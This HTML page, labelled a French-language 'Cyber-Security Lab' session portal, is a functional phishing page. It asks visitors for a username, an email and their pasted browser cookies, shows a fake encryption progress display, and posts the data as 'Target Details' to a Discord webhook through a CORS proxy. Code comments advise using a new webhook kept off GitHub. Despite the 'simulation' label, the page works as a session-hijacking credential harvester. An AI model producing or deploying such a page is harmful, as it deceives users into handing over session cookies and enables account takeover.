<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Cyber-Security Lab | User Portal</title>
    <style>
        :root { --neon-green: #00ff41; --dark-bg: #0d0208; }
        body { 
            background: var(--dark-bg); 
            color: var(--neon-green); 
            font-family: 'Courier New', monospace; 
            margin: 0; padding: 20px; 
            display: flex; flex-direction: column; align-items: center; 
        }
        .container { 
            max-width: 500px; width: 100%; border: 1px solid var(--neon-green); 
            padding: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); 
            margin-top: 50px; background: rgba(0, 20, 0, 0.9);
        }
        h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; }
        input, textarea { 
            background: black; border: 1px solid var(--neon-green); 
            color: var(--neon-green); width: 100%; padding: 12px; 
            margin: 10px 0; box-sizing: border-box; 
        }
        button { 
            background: var(--neon-green); color: black; border: none; 
            padding: 12px 20px; cursor: pointer; font-weight: bold; 
            width: 100%; transition: 0.3s; margin-top: 10px; text-transform: uppercase;
        }
        button:hover { background: white; box-shadow: 0 0 20px var(--neon-green); }
        #loading-zone { display: none; text-align: center; padding: 40px; }
        .glitch { font-size: 1.2rem; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body>

<div class="container">
    <h1>SESSION LAB v1.0</h1>

    <div id="user-view">
        <p>[SYSTEM]: Entrez les informations pour synchroniser.</p>
        <input type="text" id="username" placeholder="Username">
        <input type="email" id="userEmail" placeholder="Votre Email">
        <textarea id="cookieInput" rows="4" placeholder="Collez les Cookies ici..."></textarea>
        <button onclick="processData()">INITIER LE TRANSFERT</button>
    </div>

    <div id="loading-zone">
        <div class="glitch" id="status-text">INITIALISATION DU CRYPTAGE...</div>
        <div style="margin-top: 20px; color:white;">[████████░░░░] 65%</div>
    </div>
</div>

<script>
    async function processData() {
        const u = document.getElementById('username').value;
        const e = document.getElementById('userEmail').value;
        const c = document.getElementById('cookieInput').value;

        if(!u || !e) return alert("Erreur : Tous les champs sont requis.");

        // UI Changes
        document.getElementById('user-view').style.display = 'none';
        document.getElementById('loading-zone').style.display = 'block';

        // --- WEBHOOK CONFIG ---
        // 1. Visit https://cors-anywhere.herokuapp.com/corsdemo and click "Request temporary access"
        // 2. Use a NEW webhook URL that hasn't been pushed to GitHub
        const proxy = "https://cors-anywhere.herokuapp.com/";
        const webhookURL = "YOUR_NEW_PRIVATE_WEBHOOK_URL"; 

        const message = {
            content: "🚨 **NEW LAB DATA CAPTURED** 🚨",
            embeds: [{
                title: "Target Details",
                color: 5763719,
                fields: [
                    { name: "👤 User", value: u, inline: true },
                    { name: "📧 Email", value: e, inline: true },
                    { name: "🍪 Data", value: "```" + (c || "No data") + "```" }
                ],
                footer: { text: "Cyber Lab Simulation • " + new Date().toLocaleString() }
            }]
        };

        try {
            const response = await fetch(proxy + webhookURL, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify(message)
            });

            const statusText = document.getElementById('status-text');
            if (response.ok) {
                statusText.innerHTML = `<span style="color:white;">TRANSFERT RÉUSSI</span><br><br>Vérifiez Discord.`;
            } else {
                statusText.innerHTML = `<span style="color:red;">ERREUR RÉSEAU</span><br>Status: ${response.status}<br>Vérifiez l'accès au Proxy.`;
            }
        } catch (err) {
            console.error(err);
            document.getElementById('status-text').innerHTML = `<span style="color:red;">ÉCHEC DU TRANSFERT</span><br>Consultez la console (F12).`;
        }
    }
</script>
</body>
</html>
